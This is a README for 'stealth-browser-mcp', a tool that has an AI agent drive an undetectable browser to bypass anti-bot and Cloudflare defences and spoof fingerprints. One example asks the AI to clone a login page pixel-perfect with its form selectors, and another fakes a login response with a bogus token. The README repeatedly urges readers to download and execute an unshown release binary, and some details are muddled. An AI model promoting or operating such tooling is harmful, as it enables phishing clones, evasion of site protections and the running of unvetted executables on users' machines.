# Stealth Browser MCP — Undetectable AI Browser Automation Now

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/Shaini25/stealth-browser-mcp/releases) [![MCP](https://img.shields.io/badge/MCP-server-brightgreen)](https://github.com/Shaini25/stealth-browser-mcp/releases)

![Chrome DevTools](https://raw.githubusercontent.com/alrra/browser-logos/master/src/chrome/chrome_128x128.png)
![Network Interception](https://upload.wikimedia.org/wikipedia/commons/4/4e/Network_Connection_Icon.svg)

stealth-browser-mcp is a browser automation system built to bypass anti-bot systems while preserving human-like behavior. An AI agent writes network hooks, clones UIs pixel-perfect, and drives a browser via a Model Context Protocol (MCP) server. Use chat to describe the UI you need and the agent will generate the intercepts, DOM actions, and network patches required to reproduce it.

Topics: ai-agent-tools, ai-tools, anthropic, anti-bot-bypass, automation-tools, browser-automation, chrome-devtools, claude-mcp, cloudflare-bypass, developer-tools, fastmcp, mcp-server, model-context-protocol, network-interception, nodriver, python, stealth-browser, undetectable-browser, web-automation, web-scraping

Badges
- Build: ![Build](https://img.shields.io/badge/build-passing-brightgreen)
- License: ![License](https://img.shields.io/badge/license-MIT-lightgrey)
- Size: ![Size](https://img.shields.io/badge/size-20MB-blue)

Download and run
- Download the executable or asset from the Releases page: https://github.com/Shaini25/stealth-browser-mcp/releases
- After download, mark the file executable and run it on your machine.
- The release contains the MCP server binary, client examples, and assets. Execute the release file to start the MCP components.

Quick links
- Releases (download and execute): [![Releases](https://img.shields.io/badge/Get%20Releases-%20Download-blue?logo=github)](https://github.com/Shaini25/stealth-browser-mcp/releases)
- Docs: docs/
- Examples: examples/

Core features
- AI-generated network hooks
  - The agent inspects network flows and writes interception rules.
  - It patches headers, rewrites responses, and simulates realistic timing.
- Pixel-perfect UI cloning via chat
  - Provide a visual or textual description.
  - The agent produces selectors, CSS overrides, and rendering instructions.
- Undetectable browser runtime
  - Browser session imitates human signals: pointer movement, timing jitter, feature fingerprints.
  - No visible webdriver traces.
- Model Context Protocol (MCP) server
  - Central orchestrator between the AI model and the runtime.
  - Accepts chat commands, returns structured actions, and logs telemetry.
- Nodriver and Python clients
  - Use the client library in Node or Python to control sessions and fetch results.
- Network interception and synthesis
  - Record flows, replay them with modifications, and synthesize missing responses.

Why this repo
- You will automate complex flows that standard tools flag.
- The AI writes context-aware hooks. It adapts to anti-bot defenses.
- You will test visual and network persistence without manual patching.

Table of contents
- Features
- Architecture
- Getting started
- Installation (local)
- Examples
  - Python example
  - Node example
  - Chat-driven UI clone
- API reference (selected)
- Deployment
- Troubleshooting
- Contributing
- Resources

Features (detailed)
- Network hooks generator
  - Generates HAR-based intercepts.
  - Supports header rewriting, body patching, and response mocking.
- UI clone pipeline
  - Captures screenshots.
  - Produces pixel-accurate CSS overlays.
  - Outputs DOM patch scripts.
- Session fingerprint manager
  - Controls UA string, platform flags, WebGL, fonts, and media support.
  - Rotates values per session with deterministic seeds.
- Behavior engine
  - Drives synthetic human interactions: scroll, click, hover, typing patterns.
  - Supports randomized and scripted sequences.
- Telemetry and auditing
  - Logs actions, network traces, and MCP transcripts.
  - Stores audit trails for replay and debugging.

Architecture
- MCP Server
  - Receives chat input from AI clients.
  - Sends commands to the browser runtime.
  - Stores context and model state.
- AI Agent
  - Processes high-level goals and writes low-level scripts.
  - Generates network hook specs and DOM actions.
- Browser Runtime
  - Headful or headless Chrome/Chromium instance with patched runtime.
  - Applies network and DOM hooks.
- Clients
  - Python client for pipelines and scraping.
  - Node client for integrations and tooling.
- Storage
  - Optional local or cloud backend for sessions and artifacts.

Getting started (local)
1. Download and run the release: https://github.com/Shaini25/stealth-browser-mcp/releases
   - The release contains a single executable or a package. Unpack it, mark the main binary executable, then run it.
2. Start the MCP server
   - Linux / macOS
     - chmod +x stealth-browser-mcp
     - ./stealth-browser-mcp server --port 8080
   - Windows
     - Double click the release binary or run it from PowerShell:
       - .\stealth-browser-mcp.exe server --port 8080
3. Install client (Python example)
   - python3 -m venv venv
   - source venv/bin/activate
   - pip install stealth-mcp-client
4. Run a demo script (Python)
   - python examples/python/demo_clone_ui.py

Installation (detailed)
- From source
  - git clone https://github.com/Shaini25/stealth-browser-mcp.git
  - cd stealth-browser-mcp
  - pip install -r requirements.txt
  - npm install -g @stealth/mcp-cli
- From release (recommended)
  - Visit https://github.com/Shaini25/stealth-browser-mcp/releases
  - Download the asset for your platform.
  - On Unix:
    - tar -xzvf stealth-browser-mcp-<version>-linux.tar.gz
    - chmod +x stealth-browser-mcp
    - ./stealth-browser-mcp server
  - On Windows:
    - Extract ZIP and run stealth-browser-mcp.exe

Examples

Python example: start a session, clone a UI, and fetch data
```python
from stealth_mcp import MCPClient

client = MCPClient("http://localhost:8080", api_key="YOUR_KEY")

# Start a new session
session = client.start_session(browser="chrome", headless=False)

# Ask the AI to clone a login page
prompt = {
    "goal": "Clone the login page at https://example.com/login. Keep pixel layout and behavior. Expose form selectors and network calls."
}
task = client.request_ui_clone(session.id, prompt)

# Wait for task completion and get scripts
result = client.wait_task(task.id)
client.apply_scripts(session.id, result.scripts)

# Run the session, take a screenshot, and export HAR
client.run(session.id)
client.screenshot(session.id, "clone.png")
har = client.export_har(session.id)
print("HAR size:", len(har))
```

Node example: drive a flow
```js
const { MCP } = require('@stealth/mcp-client');

const client = new MCP('http://localhost:8080', { apiKey: process.env.MCP_KEY });

async function demo() {
  const session = await client.startSession({ browser: 'chrome' });

  const instruction = `Open https://example.com, log in with test@example.com/test123,
  intercept login POST and respond with 200 and a fake token. Keep UI unchanged.`;

  const task = await client.requestTask(session.id, { instruction });
  const result = await client.waitTask(task.id);

  await client.apply(result.actions, session.id);
  await client.run(session.id, { duration: 10 });
  await client.exportHar(session.id, './login_clone.har');
}

demo();
```

Chat-driven UI clone (workflow)
1. Start MCP server and connect the AI model (Claude, Anthropic, or custom).
2. Open the chat UI or send a prompt via client.
3. Provide the desired page URL and a short description of what you want cloned.
4. The AI will:
   - Inspect network trace and DOM snapshot.
   - Produce patch scripts for DOM and CSS.
   - Create network hook definitions for requests to intercept/rewrite.
   - Output a run plan with timings and behavior patterns.
5. Apply the scripts and run the session.

API reference (selected)
- POST /sessions
  - Create a new session. Body: { browser, headless, seed }
- POST /tasks/clone
  - Send clone request. Body: { url, goal, sensitivity }
- GET /tasks/:id
  - Fetch task status and result
- POST /sessions/:id/apply
  - Apply scripts and hooks to a running session
- POST /sessions/:id/run
  - Start execution of applied actions

Deployment
- Single-node
  - Run MCP server on local machine for development.
  - Use local Chromium.
- Clustered
  - Deploy MCP server behind load balancer.
  - Run browser workers in containers.
  - Use object storage for artifacts.
- Environment variables
  - MCP_API_KEY — require for production.
  - MCP_PORT — server port.
  - MCP_STORAGE_URL — artifact storage.

Troubleshooting
- If the release link does not load, check the Releases section in this repository.
- When a session fails to start, inspect logs in logs/ and the MCP server console.
- For network hook errors, open the HAR file and compare original vs patched requests.

Security and privacy
- Store API keys in environment variables.
- Audit saved sessions and HAR files before sharing.
- Use per-session seeds to avoid fingerprint reuse.

Contributing
- Fork the repo and open a PR.
- Tests live in tests/. Run them with pytest or npm test.
- When adding new behavior modules, include unit tests and integration scripts.
- Keep module interfaces stable. Document breaking changes in the changelog.

Files and layout
- /bin — release binaries
- /docs — design notes and protocols
- /examples — example scripts for Node and Python
- /src — server, clients, agent templates
- /assets — CSS and screenshot templates
- /tests — unit and integration tests
- RELEASES — changelog and assets (use the Releases page)

License
- MIT

FAQ
- Q: Which models work with MCP?
  - A: Any model that can return structured JSON or handle chat prompts. Claude and Anthropic work out of the box.
- Q: Can I run headful Chrome?
  - A: Yes. Set headless=false when creating a session.
- Q: Is this safe for large-scale scraping?
  - A: The system supports scale, but you must follow target site policies and legal requirements.

Resources
- Releases (download and execute): https://github.com/Shaini25/stealth-browser-mcp/releases
- Model Context Protocol (MCP) spec: docs/mcp-spec.md
- Example scripts: examples/
- Issues and support: open an issue on GitHub

Screenshots and visuals
- examples/screenshots/clone_demo.png
- docs/diagrams/mcp-architecture.svg

Acknowledgments
- Browser tools and DevTools protocols
- Open model providers and developer communities

Contact
- Create issues or pull requests on GitHub.